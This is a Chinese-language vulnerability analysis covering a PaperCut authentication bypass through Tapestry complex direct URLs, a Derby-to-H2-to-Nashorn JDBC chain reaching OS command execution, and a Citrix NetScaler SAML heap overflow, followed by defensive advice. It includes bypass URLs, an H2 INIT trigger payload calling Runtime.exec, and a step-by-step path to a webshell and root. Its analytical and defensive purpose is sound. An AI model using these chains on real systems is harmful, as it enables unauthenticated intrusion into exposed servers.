🔓 PaperCut：Tapestry页面-组件分离认证旁路

Apache Tapestry的「complex direct」机制

Apache Tapestry框架允许URL中指定两个不同的目标：一个用于显示，一个用于执行组件：

// Tapestry complex direct URL格式
?service=direct/1/PAGE/COMPONENT.$Form

// 正常请求：显示页面=执行页面
?service=direct/1/ConfigEditor/ConfigEditor.$Form
                     ↑ 显示      ↑ 执行（需认证）

// 攻击请求：显示页面≠执行页面
?service=direct/1/Error/UserList.$Form
                     ↑ 显示(公开) ↑ 执行(需认证！)

认证绕过原理

PaperCut的认证中间件只检查URL中的「显示页面」部分：

检查点看到的实际执行的结果
认证中间件Error（公开页面）—✅ 放行
Tapestry引擎—UserList.$Form（管理组件）执行管理功能

核心洞察：「页面路由」和「组件执行」是两个独立关注点，Tapestry的complex direct格式把它们分离到URL的不同段，但认证中间件只验证其中一段。

补丁绕过：denylist思维的失败

// 第一版补丁：黑名单Error和Exception页面
if (page == "Error" || page == "Exception") → 拒绝

// 绕过：用Home页面替代
?service=direct/1/Home/ConfigEditor.$Form  → 24h内被绕过

// 根本问题：修的是「哪个页面不能用」，而不是「执行组件需要什么权限」

⛓️ JDBC链式跳板：Derby→H2→Nashorn→OS RCE

攻击链总览

通过认证旁路，攻击者访问ConfigEditor组件覆写四个配置参数，然后触发UserList的cardID查询执行恶意JDBC连接：

// Step 1: 覆写配置（通过ConfigEditor组件）
db-driver = org.apache.derby.jdbc.EmbeddedDriver
db-url    = jdbc:derby:memory:pwn
sql       = CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(...)
enabled   = true

第一跳：Derby内存数据库

// Class.forName()加载Derby驱动 → static{}初始化器执行
// 创建内存Derby数据库
jdbc:derby:memory:pwn

// 执行SQL启用foreignViews特性
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(
  'derby.database.foreignViews', 'true'
);

Class.forName()是Java的动态类加载——与Runtime.exec()等价但更隐蔽。任何JDBC驱动类名都是潜在的代码执行入口。

第二跳：Derby桥接→H2

// Derby的foreignViews特性允许桥接到外部数据库
// 创建指向H2的外部视图
CREATE EXTERNAL VIEW attack AS
  FROM DERBY_JDBC_URL TO H2_JDBC_URL;

第三跳：H2→Nashorn JavaScript→OS命令

// H2的INIT参数支持创建JavaScript触发器
jdbc:h2:mem:test;INIT=CREATE TRIGGER cmd BEFORE INSERT ON test
  FOR EACH ROW CALL 'Java.type(\"java.lang.Runtime\")
  .getRuntime().exec(\"calc\")'

// Java 8-14自带Nashorn JS引擎
// new Function('java.lang.Runtime...') 可执行任意OS命令

关键洞察：「安全」数据库引擎不安全

引擎「安全」假设实际RCE路径
Derby嵌入式/轻量级foreignViews桥接+Class.forName()
H2开发/测试用INIT参数+JavaScript触发器
Nashorn脚本引擎new Function()→Runtime.exec()

💥 Citrix NetScaler：SAML PrefixList堆溢出

漏洞原理

Citrix NetScaler的SAML签名验证在处理InclusiveNamespaces元素的PrefixList属性时：

// SAML XML中的InclusiveNamespaces
<InclusiveNamespaces PrefixList="a b c d ...几千个前缀..."
  xmlns="http://www.w3.org/2001/10/xml-exc-c14n#"/>

// 处理逻辑（简化）
char buffer[固定大小];  // 全局缓冲区
memcpy(buffer, prefixList, strlen(prefixList));  // ← 无长度检查！

利用链：堆溢出→write-what-where→shellcode

// watchTowr PoC利用链：
1. 提供~2000个唯一标记的前缀令牌
2. 溢出固定大小缓冲区
3. 破坏相邻堆chunk元数据
4. 覆写数据指针
5. 后续memcpy使用被破坏指针 → write-what-where原语
6. 覆写函数指针 → 跳转到shellcode
7. 堆可执行 → drop PHP webshell
8. /bin/sh设置SUID → root

单个畸形SAML HTTP请求，无认证无交互。

厂商降级：DoS实为RCE

阶段Citrix描述真实影响CVSS
初始公告DoS/不可预测行为—低
watchTowr PoC—unauth root RCE9.8

22000+暴露实例 + 12天内36次利用尝试——网络边缘设备是最高优先级目标。

🧠 方法论：厂商降级公告≠真实影响

这三枚CVE共同揭示了一个系统性问题：

降级模式识别

// 降级信号（出现任一条→优先重新评估）
1. 厂商说「DoS」但网络可达 + 影响Auth组件
2. CVSS评分机构间分歧大（NVD vs 厂商）
3. 补丁描述含「unpredictable behavior」
4. 漏洞影响认证/授权协议的解析器（XML/SAML/JWT）
5. 设备暴露在公网（VPN/网关/负载均衡器）

🛡️ 防御思路

  • 认证校验：校验「执行组件的权限」而非「显示页面的身份」
  • JDBC白名单：限制Class.forName()只能加载预定义的驱动类名
  • XML规范化：对SAML PrefixList等攻击者可控字段做长度校验
  • 厂商公告：对「DoS」评级+网络可达+Auth组件影响的漏洞，优先自行验证RCE可能性
  • 最小暴露面：VPN/网关/负载均衡器的管理接口不暴露公网
